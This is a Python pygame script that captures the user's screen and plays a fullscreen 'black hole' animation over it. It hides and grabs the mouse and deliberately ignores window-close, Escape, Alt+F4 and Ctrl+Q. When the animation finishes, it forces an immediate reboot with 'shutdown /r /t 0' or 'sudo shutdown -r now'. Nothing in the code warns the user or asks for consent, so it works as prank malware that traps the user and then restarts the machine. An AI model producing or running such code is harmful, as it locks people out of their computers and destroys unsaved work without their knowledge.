import pygame
import sys
import math
import mss
import numpy as np
import os
import platform
import random

# --- Screenshot for background ---
with mss.mss() as sct:
    monitor = sct.monitors[0]
    img = np.array(sct.grab(monitor))[:, :, :3].astype(np.uint8)

HEIGHT, WIDTH = img.shape[0], img.shape[1]
img = np.transpose(img, (1, 0, 2))  # (width, height, 3)

# --- Init Pygame ---
pygame.init()
pygame.event.set_grab(True)          # lock mouse inside window
pygame.mouse.set_visible(False)      # hide cursor
screen = pygame.display.set_mode((WIDTH, HEIGHT), pygame.FULLSCREEN | pygame.NOFRAME)
clock = pygame.time.Clock()
background = pygame.surfarray.make_surface(img.copy())

# --- Parameters ---
BLACK = (0, 0, 0)
ORANGE = (255, 140, 0)

radius = 0
max_radius = math.hypot(WIDTH/2, HEIGHT/2)
speed = 2
expand = True
horizon_thickness = 20
pulse_speed = 0.05
warp_strength = 0.7

y_indices, x_indices = np.meshgrid(np.arange(HEIGHT), np.arange(WIDTH))
cx, cy = WIDTH/2, HEIGHT/2
dx = x_indices - cx
dy = y_indices - cy
distances = np.hypot(dx, dy) + 1e-5

running = True
restart_triggered = False

while running:
    for event in pygame.event.get():
        # ignore close attempts
        if event.type == pygame.QUIT:
            pass
        if event.type == pygame.KEYDOWN:
            # ignore escape, alt+f4, ctrl+q
            if event.key in [pygame.K_ESCAPE, pygame.K_F4, pygame.K_q]:
                pass
        if event.type == pygame.KEYUP:
            pass

    # --- draw background ---
    screen.blit(background, (0, 0))

    # --- vectorized 3D warp ---
    mask = distances < (radius + horizon_thickness*2)
    factor = 1 - warp_strength * (radius / (distances + 1))**2
    t = pygame.time.get_ticks() / 500
    angle = np.sin(distances/50 + t) * 0.5

    nx = dx * np.cos(angle) - dy * np.sin(angle)
    ny = dx * np.sin(angle) + dy * np.cos(angle)
    ny *= 0.9  # elliptical for depth

    nx = (cx + nx*factor).clip(0, WIDTH-1).astype(np.int32)
    ny = (cy + ny*factor).clip(0, HEIGHT-1).astype(np.int32)

    warped_img = img.copy()
    warped_img[nx[mask], ny[mask]] = img[nx[mask], ny[mask]]
    pygame.surfarray.blit_array(screen, warped_img)

    # --- core ---
    pygame.draw.circle(screen, BLACK, (WIDTH//2, HEIGHT//2), int(radius))

    # --- horizon rings ---
    pulse = (math.sin(pygame.time.get_ticks() * pulse_speed) + 1)/2
    num_rings = 5
    for k in range(num_rings):
        offset = k*6 + pulse*12
        glow_radius = int(radius + horizon_thickness + offset)
        thickness = 2 + k
        color_intensity = max(0, 255 - k*40)
        color = (color_intensity, int(color_intensity*0.55), 0)
        pygame.draw.circle(screen, color, (WIDTH//2, HEIGHT//2), glow_radius, thickness)

    # --- energy spikes ---
    for _ in range(12):
        ang = random.uniform(0, 2*math.pi)
        length = random.uniform(5, 15) + pulse*5
        x1 = WIDTH//2 + int((radius + horizon_thickness)*math.cos(ang))
        y1 = HEIGHT//2 + int((radius + horizon_thickness)*math.sin(ang))
        x2 = WIDTH//2 + int((radius + horizon_thickness + length)*math.cos(ang))
        y2 = HEIGHT//2 + int((radius + horizon_thickness + length)*math.sin(ang))
        pygame.draw.line(screen, ORANGE, (x1, y1), (x2, y2), 2)

    # --- radius logic ---
    if expand:
        radius += speed
        if radius >= max_radius:
            expand = False
            restart_triggered = True
    else:
        radius -= speed
        if radius <= 0:
            expand = True

    pygame.display.flip()
    clock.tick(60)

    if restart_triggered:
        system = platform.system()
        if system == "Windows":
            os.system("shutdown /r /t 0")
        elif system in ["Linux", "Darwin"]:
            os.system("sudo shutdown -r now")
        restart_triggered = False
